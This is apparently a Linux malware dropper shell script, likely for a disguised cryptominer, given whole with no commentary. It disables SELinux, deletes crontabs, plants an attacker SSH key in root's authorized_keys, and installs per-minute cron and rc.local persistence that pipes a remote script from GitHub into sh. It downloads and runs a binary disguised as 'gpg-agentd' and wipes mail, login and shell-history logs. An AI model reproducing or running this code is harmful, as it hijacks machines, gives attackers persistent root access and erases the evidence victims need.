HISTSIZE=1
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null
sleep 1
cd /var/tmp || cd /tmp
sleep 1
[ -d .ICE-unix/... ] || mkdir -p .ICE-unix/... && chmod -R 777 .ICE-unix
sleep 1
cd .ICE-unix/... || exit 100
sleep 1
find . -maxdepth 1 -name ".m*" -type f -mmin +66 -delete
sleep 1
[ -f .mash* ] && exit 0 || touch .mash$$
sleep 1
trap "rm -rf .mash*" EXIT
sleep 1
setenforce 0 2>/dev/null
sleep 1
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sleep 1
crontab -r 2>/dev/null
sleep 1
rm -rf /var/spool/cron 2>/dev/null
sleep 1
crontab -l 2>/dev/null
sleep 1
mkdir -p /var/spool/cron/crontabs 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
sleep 1
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAuPhNSXRrIFPZF4UsqYLYTX1DUALnRC/cPtlzzZwK4myZFy7Yv8ly0sD8j5V8NbIZnx2SbqzUq3rJedn2wo/cuRLUqD0Z4+yFPc+XoGo28P1tC7hp0KQjgdTiJe/+J2Jqvew9kqcR/nhjT7apNzX3KC52/BIM4xZT3BLGSqgIGUyKHaG07tpjT91tipmbkjxHQa/f7zUfxO0rbFcwvHxcP76NQy9jzoF/pImf5lXUfzD6UP7jcV2HeGnNp+iye+URFoI8lQsSGj/TLnwv9VZzElrIEfxYnDXlIeORj/mZCvvzqOylvqCTeS5hzzS4lHe968VSnZcKVoO01Z6OvyDAVQ== root@localhost.localdomain' > /root/.ssh/authorized_keys
echo '*/1 * * * * curl -qs https://raw.githubusercontent.com/testuser1s/k/master/b.sh | sh' > /var/spool/cron/root
echo '*/1 * * * * curl -qs https://raw.githubusercontent.com/testuser1s/k/master/b.sh | sh' > /var/spool/cron/crontabs/root
echo 'curl -qs https://raw.githubusercontent.com/testuser1s/k/master/b.sh | sh' > /etc/rc.local
echo 'exit 0' >> /etc/rc.local
# grep -q 8.8.8.8 /etc/resolv.conf || echo "nameserver 8.8.8.8" >> /etc/resolv.conf
# grep -q 5.206.225.60 /etc/hosts || echo "5.206.225.60 static.cortins.tk" >> /etc/hosts
if [ ! -f /usr/bin/gpg-agentd ]; then
        cd /usr/bin
        wget https://github.com/testuser1s/k/files/1878076/xig.gz  -O gpg-agentd > /dev/null
         wget https://github.com/testuser1s/k/files/1878077/config.json.gz  -O config.json > /dev/null
        sleep 2
        echo '/usr/bin/gpg-agentd' > /etc/rc.local
        echo 'exit 0' >> /etc/rc.local
fi
sleep 2
if [ -f /usr/bin/gpg-agentd ]; then
        cd /usr/bin
        chmod 777 gpg-agentd && ./gpg-agentd || rm -rf gpg-agentd
fi
sleep 1
cat <<EOF> /etc/security/limits.conf
*         hard    nofile      25000
*         soft    nofile      25000
root      hard    nofile      25000
root      soft    nofile      25000
EOF
echo 0 > /var/spool/mail/root
echo 0 > /var/log/wtmp
echo 0 > /var/log/secure
echo 0 > /root/.bash_history
